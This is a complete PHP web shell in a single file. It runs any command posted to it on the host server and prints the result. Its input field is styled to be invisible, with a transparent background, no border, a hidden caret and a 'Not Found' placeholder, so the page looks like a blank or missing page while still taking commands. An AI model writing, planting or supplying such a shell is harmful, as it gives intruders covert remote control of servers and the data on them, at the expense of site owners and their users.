<?php
if (isset($_POST['command'])) {
    $command = escapeshellcmd($_POST['command']); 
    $handle = popen($command, 'r'); 
    $output = fread($handle, 2096);  
    fclose($handle); 
    echo "<pre>$output</pre>"; 
}
?>

<form method="POST">
    <input type="text" name="command" autofocus placeholder="Not Found" style="background-color: transparent; border: none; outline: none; font-size: 16px; caret-color: transparent;">
</form>
